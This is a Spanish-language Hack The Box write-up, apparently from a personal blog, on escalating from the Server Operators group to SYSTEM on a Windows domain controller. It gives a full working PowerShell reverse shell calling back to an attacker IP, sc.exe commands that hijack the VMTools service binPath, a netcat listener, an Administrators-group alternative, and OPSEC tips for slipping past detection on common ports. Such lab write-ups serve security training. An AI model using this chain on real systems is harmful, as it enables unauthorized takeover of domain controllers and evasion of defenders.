---
title: "Server Operators - Abuso para Escalada de Privilegios"
date: 2026-03-10
categories:
  - Hack The Box
  - Windows
tags:
  - Active Directory
  - Privilege Escalation
  - Windows
  - Server Operators
  - Service Abuse
  - Evil-WinRM
  - Reverse Shell
  - HTB
  - LDAP
layout: single
author_profile: true
show_date: true
toc: true
---

## ¿Qué es el grupo Server Operators?

`BUILTIN\Server Operators` (SID: `S-1-5-32-549`) es un grupo local privilegiado de Windows que existe por defecto en **Domain Controllers**. A diferencia de grupos como `Administrators`, este grupo está diseñado para delegar tareas operativas del servidor sin otorgar control total del sistema, pero en la práctica sus permisos abren una superficie de ataque crítica.

Los miembros de este grupo tienen capacidad para:

- Iniciar y detener servicios del sistema
- Modificar la configuración de servicios (incluyendo el `binPath`)
- Hacer login local en Domain Controllers
- Crear y eliminar shared folders
- Formatear discos
- Hacer backup y restore de archivos (`SeBackupPrivilege` / `SeRestorePrivilege`)

El vector de ataque más directo y poderoso es la **modificación del binario de un servicio**, ya que muchos servicios del sistema corren como `NT AUTHORITY\SYSTEM`.

---

## Reconocimiento - Identificar la membresía

Al obtener una shell con `svc-printer` via Evil-WinRM, lo primero que hago es `whoami /all` para auditar mis grupos y privilegios:

[![](/assets/images/175.png)](/assets/images/175.png)

El output relevante fue:

```
BUILTIN\Server Operators   Alias   S-1-5-32-549   Mandatory group, Enabled by default, Enabled group
```

Esto es inmediatamente una señal de alarma (positiva para el atacante). El usuario de servicio `svc-printer` fue configurado en este grupo probablemente para que pudiera gestionar servicios de impresión, pero esa delegación excesiva nos da la palanca para escalar.

---

## El Vector: Modificación del BinPath de un Servicio

### ¿Por qué funciona esto?

Cuando Windows ejecuta un servicio, lo hace con el contexto del usuario configurado en ese servicio. Los servicios del sistema como `VMTools`, `browser`, `VSS`, etc., corren como `NT AUTHORITY\SYSTEM`, la cuenta con máximos privilegios en el sistema operativo.

`sc.exe` es la herramienta nativa de Windows para gestionar servicios. Con `sc.exe config` puedo modificar el `binpath`, que es la ruta al ejecutable que se lanza cuando el servicio arranca. Como miembro de `Server Operators`, tengo permiso para hacer exactamente eso.

La lógica es:

> **Si puedo cambiar qué ejecutable corre un servicio de SYSTEM, y puedo reiniciar ese servicio, entonces puedo ejecutar cualquier comando como SYSTEM.**

---

## Explotación Paso a Paso

### 1. Selección del servicio objetivo

Elegí `VMTools` (VMware Tools) porque es un servicio estándar, siempre presente en máquinas virtuales, y corre como `SYSTEM`. Cualquier servicio del sistema con esas características sirve.

### 2. Preparar el listener

En mi Kali preparo netcat esperando la conexión entrante:

```bash
nc -lvnp 4444
```

### 3. Generar el payload

Uso un one-liner de PowerShell para reverse shell, codificado en Base64 (UTF-16LE) porque el parámetro `-EncodedCommand` de PowerShell lo requiere así. El payload en texto claro es:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.15",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

### 4. Modificar el binPath del servicio

```powershell
sc.exe config VMTools binpath="cmd /c powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>"
```

El `cmd /c` es necesario como wrapper porque `sc.exe` necesita que el binario sea un ejecutable directo, y `powershell.exe` con sus argumentos necesita pasar por `cmd` para interpretarse correctamente.

### 5. Reiniciar el servicio

```powershell
sc.exe stop VMTools
sc.exe start VMTools
```

El comando `sc.exe start` devuelve error `1053` ("The service did not respond to the start or control request in a timely fashion"). Esto es **completamente esperado y normal**: el servicio no puede reportar que arrancó correctamente porque nuestro payload no implementa la lógica de comunicación con el Service Control Manager. Sin embargo, **el comando del binPath ya se ejecutó** antes de que expire el timeout.

---

## Resultado

En mi listener recibo la conexión y verifico con `whoami /all`:

[![](/assets/images/174.png)](/assets/images/174.png)

Escalada completa a `NT AUTHORITY\SYSTEM`

---

## OPSEC: ¿Por qué la reverse shell es mejor que agregar al grupo Administrators?

Una alternativa más simple es:

```powershell
sc.exe config VMTools binpath="cmd /c net localgroup administrators svc-printer /add"
```

Esto funciona, pero tiene desventajas desde el punto de vista de OPSEC:

|Método|Ventaja|Desventaja|
|---|---|---|
|`net localgroup administrators /add`|Simple, sin listener|Deja rastro permanente en AD, detectable fácilmente|
|Reverse Shell|No modifica grupos, más sigiloso|Requiere listener activo, conexión saliente|

En un engagement real, **modificar la membresía de grupos de dominio** es una de las acciones más ruidosas posibles: queda en logs de Active Directory, en SIEMs, y cualquier solución de detección decente lo alerta de inmediato. La reverse shell en cambio es una conexión de red saliente que, si el puerto está permitido por el firewall (4444 puede levantarse en 443, 80, o 8443 para mayor evasión), pasa más desapercibida.

Además, con la reverse shell no necesito persistencia: tomo lo que necesito y me voy, minimizando la huella.

---

## Restaurar el servicio (cleanup)

Después de terminar, es buena práctica restaurar el binPath original del servicio para no dejar el sistema roto:

```powershell
sc.exe config VMTools binpath="C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
sc.exe start VMTools
```

---

## Resumen del ataque

```
svc-printer (Server Operators)
        │
        ▼
sc.exe config VMTools binpath="<payload>"
        │
        ▼
sc.exe stop/start VMTools
        │
        ▼
Servicio ejecuta payload como SYSTEM
        │
        ▼
Reverse shell → NT AUTHORITY\SYSTEM
```
